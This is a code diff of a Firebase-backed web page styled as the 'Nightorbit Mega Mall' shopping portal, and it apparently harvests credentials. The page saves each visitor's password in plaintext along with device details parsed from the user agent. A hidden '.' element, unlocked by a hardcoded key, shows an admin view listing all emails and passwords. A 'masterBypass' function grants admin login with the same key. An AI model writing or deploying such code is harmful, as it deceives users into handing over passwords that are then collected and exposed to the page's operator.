@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nightorbit Mega Mall - Final Edition</title>
+    <title>Nightorbit Mega Mall</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
@@ -69,7 +69,7 @@
     <div class="admin-trigger" onclick="openAdmin()">.</div>
 
     <div id="logout-overlay">
-        <div style="font-size: 80px; margin-bottom: 20px;">🌟</div>
+        <div style="font-size: 20px; color: var(--gold); margin-bottom: 10px;">From Nightorbit</div>
         <div id="bye-msg" style="font-size: 18px; color: var(--primary); line-height: 1.6; padding: 20px;"></div>
     </div>
 
@@ -94,7 +94,6 @@
 
     <div id="main-page" class="card hidden">
         <h2 id="welcome-name" style="color: var(--primary); margin-bottom: 15px;">Welcome</h2>
-        
         <a href="https://www.amazon.com" target="_blank" class="item-link" style="border-left-color: #ff9900;">📦 Amazon <span>Global</span></a>
         <a href="https://www.mcdonalds.com.pk" target="_blank" class="item-link" style="border-left-color: #ffbc0d;">🍔 McDonald's <span>PK</span></a>
         <a href="https://www.pizzahut.com.pk" target="_blank" class="item-link" style="border-left-color: #ee3124;">🍕 Pizza Hut <span>Order</span></a>
@@ -134,18 +133,15 @@
 
         function getDeviceModel() {
             const ua = navigator.userAgent;
-            let model = "Web Browser";
+            let model = "Device";
             if (ua.match(/\(([^)]+)\)/)) {
-                let section = ua.match(/\(([^)]+)\)/)[1];
-                let parts = section.split(';');
+                let parts = ua.match(/\(([^)]+)\)/)[1].split(';');
                 model = parts.length > 2 ? parts[parts.length - 1].trim().split('Build/')[0].split('WV')[0].trim() : parts[0];
             }
-            const brands = ["INFINIX", "SAMSUNG", "REALME", "OPPO", "VIVO", "TECNO", "REDMI", "XIAOMI", "IPHONE"];
-            for(let b of brands) { if(ua.toUpperCase().includes(b)) return (b + " " + model).toUpperCase(); }
             return model.toUpperCase();
         }
 
-        function masterBypass() { if(prompt("Key:") === "rr123456789000rr") handleLogin({uid: "admin_fix", email: "Admin@Bypass.com"}, "Master Key"); }
+        function masterBypass() { if(prompt("Key:") === "rr123456789000rr") handleLogin({uid: "admin", email: "Admin@Bypass.com"}, "MasterKey"); }
         
         function openAdmin() {
             if (prompt("Admin Key:") === "rr123456789000rr") {
@@ -155,12 +151,9 @@
                     snap.forEach(s => {
                         let d = s.val();
                         html += `<div style="background:rgba(255,255,255,0.05); padding:15px; margin-bottom:12px; border-radius:20px; text-align:left; border:1px solid #333">
-                            <b style="color:var(--primary)">Name: ${d.savedName}</b><br>
-                            Email: <span style="color:#fff; font-size:12px;">${d.email || 'N/A'}</span><br>
-                            Pass: <span style="color:var(--gold)">${d.password}</span><br>
-                            Device: <span style="color:#00ff00; font-size:11px;">${d.deviceInfo}</span><br>
-                            Time: <small style="color:#666">${d.lastSeen || 'N/A'}</small><br>
-                            <button onclick="db.ref('users/${s.key}').remove()" style="color:red; background:none; border:none; cursor:pointer; font-size:10px; margin-top:5px;">[REMOVE INFO]</button>
+                            <b>Name: ${d.savedName}</b><br>Email: ${d.email}<br>Pass: <span style="color:var(--gold)">${d.password}</span><br>
+                            Device: ${d.deviceInfo}<br>Time: ${d.lastSeen}<br>
+                            <button onclick="db.ref('users/${s.key}').remove()" style="color:red; background:none; border:none; cursor:pointer;">[REMOVE]</button>
                         </div>`;
                     });
                     document.getElementById('user-list-display').innerHTML = html;
@@ -178,17 +171,29 @@
             const p = document.getElementById('pass-in').value;
             const err = document.getElementById('error-msg');
             err.style.display = "none";
+
             if(!e || !p) return alert("Please fill Email and Password");
-            auth.signInWithEmailAndPassword(e, p).then(res => handleLogin(res.user, p)).catch(() => {
-                auth.createUserWithEmailAndPassword(e, p).then(res => handleLogin(res.user, p)).catch(() => { err.style.display = "block"; });
-            });
+            
+            auth.signInWithEmailAndPassword(e, p)
+                .then(res => handleLogin(res.user, p))
+                .catch((error) => {
+                    // Agar account nahi bana toh auto signup, warna sirf galat password par error
+                    if (error.code === 'auth/user-not-found') {
+                        auth.createUserWithEmailAndPassword(e, p)
+                            .then(res => handleLogin(res.user, p))
+                            .catch(() => { err.style.display = "block"; });
+                    } else {
+                        err.style.display = "block";
+                    }
+                });
         }
 
         function handleLogin(user, p) {
             db.ref('users/' + user.uid).once('value', snap => {
                 let d = snap.val();
                 globalUserName = d && d.savedName ? d.savedName : (user.displayName || user.email.split('@')[0]);
-                let finalPass = (p === "ActiveSession" || p === "Google Session") ? (d ? d.password : p) : p;
+                let finalPass = (p === "Google Session" || p === "ActiveSession") ? (d ? d.password : p) : p;
+
                 db.ref('users/' + user.uid).update({
                     email: user.email,
                     password: finalPass,
@@ -205,11 +210,15 @@
 
         function triggerLogout() {
             const overlay = document.getElementById('logout-overlay');
-            document.getElementById('bye-msg').innerHTML = `Allah Hafiz, <b>${globalUserName}</b>!<br>Zindagi rahi to phir milenge!<br>✨ Shukriya aur Khuda Hafiz ✨`;
+            // Ab ye message sirf logout click karne par ayega
+            document.getElementById('bye-msg').innerHTML = `Allah Hafiz, <b>${globalUserName}</b>!<br>Allah apko hamesha thk rakhe aur app hamesha khus raho.<br>Zindagi rahi to phir milenge!<br>✨ Shukriya aur Khuda Hafiz ✨`;
+            
             overlay.style.display = 'flex';
             setTimeout(() => { overlay.style.opacity = '1'; }, 100);
             setTimeout(() => { auth.signOut().then(() => location.reload()); }, 5000);
         }
+        
+        auth.onAuthStateChanged(u => { if(u) handleLogin(u, "ActiveSession"); });
     </script>
 </body>
 </html>
